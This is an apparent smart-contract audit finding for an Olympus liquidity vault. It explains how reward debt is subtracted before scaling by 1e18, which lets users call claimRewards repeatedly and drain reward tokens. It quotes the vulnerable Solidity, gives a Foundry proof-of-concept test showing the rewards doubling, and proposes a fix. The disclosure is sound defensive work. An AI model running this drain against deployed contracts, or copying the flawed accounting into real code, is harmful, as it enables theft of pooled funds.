Dug

high

# Incorrect application of debt allows reward tokens to be drained from liquidity vault

## Summary

When calculating rewards, `userRewardDebts` are not correctly deducted from the returned reward amounts. This allows an attacker to repeatedly call `claimRewards`, transferring rewards from the contract witch each call, until it is drained of one or more reward tokens

## Vulnerability Detail

After a user has held an LP position for a length of time, they can call `claimRewards` and receive their allocation of rewards from the contract. For each reward token, internal functions handle the payout of each type: `_claimInternalRewards` and `_claimExternalRewards`. 

For both, a reward amount is calculated in `internalRewardsForToken` or `externalRewardsForToken` respectively. 
```solidity
        uint256 reward = internalRewardsForToken(id_, msg.sender);
```

Then, the `userRewardDebts` are increased for the token by the reward amount. 

```solidity
        userRewardDebts[msg.sender][rewardToken] += reward;
```
The reward is then transferred to the sender.

So, `userRewardDebts` is being updated correctly based on the payout, but the issue is in how the reward is being calculated within `internalRewardsForToken` and `externalRewardsForToken`.

```solidity
    function internalRewardsForToken(uint256 id_, address user_) public view returns (uint256) {
        InternalRewardToken memory rewardToken = internalRewardTokens[id_];
        uint256 lastRewardTime = rewardToken.lastRewardTime;
        uint256 accumulatedRewardsPerShare = rewardToken.accumulatedRewardsPerShare;

        if (block.timestamp > lastRewardTime && totalLP != 0) {
            uint256 timeDiff = block.timestamp - lastRewardTime;
            uint256 totalRewards = timeDiff * rewardToken.rewardsPerSecond;

            // This correctly uses 1e18 because the LP tokens of all major DEXs have 18 decimals
            accumulatedRewardsPerShare += (totalRewards * 1e18) / totalLP;
        }

        // This correctly uses 1e18 because the LP tokens of all major DEXs have 18 decimals
        uint256 totalAccumulatedRewards = (lpPositions[user_] * accumulatedRewardsPerShare) -
            userRewardDebts[user_][rewardToken.token];

        return (cachedUserRewards[user_][rewardToken.token] + totalAccumulatedRewards) / 1e18;
    }
```
When calculating the return, `userRewardDebts[user_][rewardToken.token]` is deducted from the `totalAccumulatedRewards` instead of from the returned reward. This results in the debt deducted being off by a factor of `1e18`. Nearly the entire accumulated reward is being returned without correctly accounting for the previous rewards that are tracked with `userRewardDebts`.

So, back in `_claimInternalRewards` and `_claimExternalRewards` the reward is outsized if the user has any existing `userRewardDebt` for that token.

## Impact

This issue creates a vulnerability where users can repeatedly call `claimRewards` to multiply their rewards. With each call, the contract calculates the reward without taking into account the users reward debt.

This issue occurs with both internal and external rewards. 

Additionally, the underlying bug creates issues when `_claimInternalRewards` and `_claimExternalRewards` is called as part of a withdrawal.

### Proof of concept

```solidity
    function testExploit__canMultiplyRewards() public {
        _withdrawTimeSetUp();

        // Verify initial state
        assertTrue(ldo.balanceOf(alice) == 0);
        assertTrue(liquidityVault.userRewardDebts(alice, address(ldo)) == 0);

        // Claim
        vm.prank(alice);
        liquidityVault.claimRewards();
        console2.log("1x Internal reward: ", ldo.balanceOf(alice));
        console2.log("Debts: ", liquidityVault.userRewardDebts(alice, address(ldo)));
        // 1x Internal reward:  9_999_999_999_999_999_977
        // Debts:               9_999_999_999_999_999_977

        vm.prank(alice);
        liquidityVault.claimRewards();
        console2.log("2x Internal reward: ", ldo.balanceOf(alice));
        console2.log("Debts: ", liquidityVault.userRewardDebts(alice, address(ldo)));
        // 1x Internal reward: 19_999_999_999_999_999_944
        // Debts:              19_999_999_999_999_999_944

        // Additional claims can be made until one of the reward tokens is drained
    }
```

## Code Snippet

https://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L350-L386

## Tool used

Manual Review

## Recommendation

Update how user reward debt is deducted from rewards within `internalRewardsForToken` and `externalRewardsForToken`.

```diff
- uint256 totalAccumulatedRewards = (lpPositions[user_] * accumulatedRewardsPerShare) - userRewardDebts[user_][rewardToken.token];
- return (cachedUserRewards[user_][rewardToken.token] + totalAccumulatedRewards) / 1e18;

+ uint256 totalAccumulatedRewards = (lpPositions[user_] * accumulatedRewardsPerShare);
+ return (cachedUserRewards[user_][rewardToken.token] + totalAccumulatedRewards) / 1e18 - userRewardDebts[user_][rewardToken.token];
```

```diff
- uint256 totalAccumulatedRewards = (lpPositions[user_] * rewardToken.accumulatedRewardsPerShare) - userRewardDebts[user_][rewardToken.token];
- return (cachedUserRewards[user_][rewardToken.token] + totalAccumulatedRewards) / 1e18;

+ uint256 totalAccumulatedRewards = (lpPositions[user_] * rewardToken.accumulatedRewardsPerShare);
+ return (cachedUserRewards[user_][rewardToken.token] + totalAccumulatedRewards) / 1e18 - userRewardDebts[user_][rewardToken.token];
```